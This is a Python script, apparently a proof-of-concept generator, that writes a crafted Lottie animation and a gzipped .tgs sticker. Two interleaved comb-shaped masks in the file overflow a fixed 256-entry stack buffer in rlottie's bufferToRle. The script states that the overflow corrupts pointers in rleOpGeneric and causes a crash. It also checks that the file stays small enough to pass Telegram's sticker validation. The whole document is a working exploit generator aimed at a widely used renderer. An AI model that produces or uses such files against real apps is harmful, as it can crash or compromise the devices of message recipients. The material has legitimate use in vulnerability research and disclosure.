#!/usr/bin/env python3
"""
gen_poc_v7.py — Double-comb PoC for rlottie bufferToRle stack overflow.

Strategy: 3 masks, only 2 XOR operations (FAST), massive overflow.

  Mask 0 (Add):        solid rectangle (full canvas)
  Mask 1 (Difference): comb A — 255 teeth at integer positions
  Mask 2 (Difference): comb B — 255 teeth shifted by 0.5 canvas units

At 1024×1024 render (2× canvas):
  - Comb A teeth: [0,2), [4,6), ..., [1016,1018)  → 255 spans after XOR with solid
  - Comb B teeth: [1,3), [5,7), ..., [1017,1019)  → interleaves perfectly
  - Result: alternating 0/255 every pixel → ~510 spans per scanline
  - Overflow: 510 - 256 = 254 spans = 2032 bytes past temp[256]

This massive overflow corrupts `out`, `available`, and all loop pointers
in rleOpGeneric, causing SIGSEGV on the next pointer dereference.
"""

import argparse
import gzip
import io
import json
import sys


def make_rect(x0, y0, x1, y1):
    verts = [[x0, y0], [x1, y0], [x1, y1], [x0, y1]]
    zeros = [[0, 0]] * 4
    return {"i": zeros, "o": zeros, "v": verts, "c": True}


def make_comb(n_teeth, tooth_w, gap_w, height, x_offset=0.0):
    """Zigzag comb: n_teeth teeth, each tooth_w wide, gap_w gap, offset by x_offset."""
    H = float(height)
    verts = []
    period = tooth_w + gap_w

    for k in range(n_teeth):
        x_base = x_offset + k * period
        verts.append([x_base, 0.0])
        verts.append([x_base + tooth_w, 0.0])
        verts.append([x_base + tooth_w, H])
        verts.append([x_base + period, H])

    # Close bottom
    verts.append([x_offset + n_teeth * period, H])
    verts.append([x_offset, H])

    n = len(verts)
    assert n <= 1024, f"Too many vertices: {n} > 1024"
    return {"i": [[0, 0]] * n, "o": [[0, 0]] * n, "v": verts, "c": True}


def sv(v):
    return {"a": 0, "k": v}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--json", default="poc_v7.json")
    ap.add_argument("--tgs", default="poc_v7.tgs")
    ap.add_argument("--teeth", type=int, default=255)
    ap.add_argument("--width", type=int, default=512)
    ap.add_argument("--height", type=int, default=512)
    args = ap.parse_args()

    W, H = args.width, args.height
    n = args.teeth
    n_verts = n * 4 + 2

    print(f"Canvas:        {W}×{H}")
    print(f"Teeth:         {n} (vertices: {n_verts}, limit: 1024)")
    print(f"Comb A:        teeth at [0,1), [2,3), ..., [{2*(n-1)},{2*(n-1)+1})")
    print(f"Comb B:        shifted +0.5: teeth at [0.5,1.5), [2.5,3.5), ...")
    print(f"At 1024 render: ~{2*n} spans/scanline, overflow ~{2*n - 256} spans")

    if n_verts > 1024:
        print(f"FAIL: {n_verts} > 1024 vertices")
        sys.exit(1)

    masks = [
        # Mask 0: Add — solid
        {"mode": "a", "inv": False, "o": sv(100),
         "pt": {"a": 0, "k": make_rect(0, 0, W, H)}},
        # Mask 1: Difference — comb A (teeth at integer positions)
        {"mode": "f", "inv": False, "o": sv(100),
         "pt": {"a": 0, "k": make_comb(n, 1.0, 1.0, H, 0.0)}},
        # Mask 2: Difference — comb B (shifted 0.5 canvas units)
        {"mode": "f", "inv": False, "o": sv(100),
         "pt": {"a": 0, "k": make_comb(n, 1.0, 1.0, H, 0.5)}},
    ]

    layer = {
        "ty": 4, "nm": "Overflow", "ind": 1,
        "st": 0, "ip": 0, "op": 2, "sr": 1,
        "ks": {
            "p": sv([0, 0, 0]), "a": sv([0, 0, 0]),
            "s": sv([100, 100, 100]), "r": sv(0), "o": sv(100),
        },
        "hasMask": True, "masksProperties": masks,
        "shapes": [{
            "ty": "gr", "nm": "G", "it": [
                {"ty": "rc", "nm": "R",
                 "p": sv([W/2, H/2]), "s": sv([W, H]), "r": sv(0)},
                {"ty": "fl", "nm": "F",
                 "c": sv([1, 0, 0, 1]), "o": sv(100), "r": 1},
            ],
        }],
    }

    lottie = {
        "v": "5.5.2", "fr": 60, "ip": 0, "op": 2,
        "w": W, "h": H, "nm": "overflow-v7", "ddd": 0,
        "assets": [], "layers": [layer],
    }

    jb = json.dumps(lottie, separators=(",", ":")).encode()
    with open(args.json, "wb") as f:
        f.write(jb)
    print(f"\n[+] JSON: {args.json} ({len(jb):,} bytes)")

    buf = io.BytesIO()
    with gzip.GzipFile(fileobj=buf, mode="wb", mtime=0) as gz:
        gz.write(jb)
    tgs = buf.getvalue()
    with open(args.tgs, "wb") as f:
        f.write(tgs)
    print(f"[+] TGS:  {args.tgs} ({len(tgs):,} bytes)")

    if len(tgs) > 64 * 1024:
        print(f"[FAIL] TGS {len(tgs)} > 65536")
    else:
        print(f"[OK] Under 64KB, passes Telegram validation")


if __name__ == "__main__":
    main()
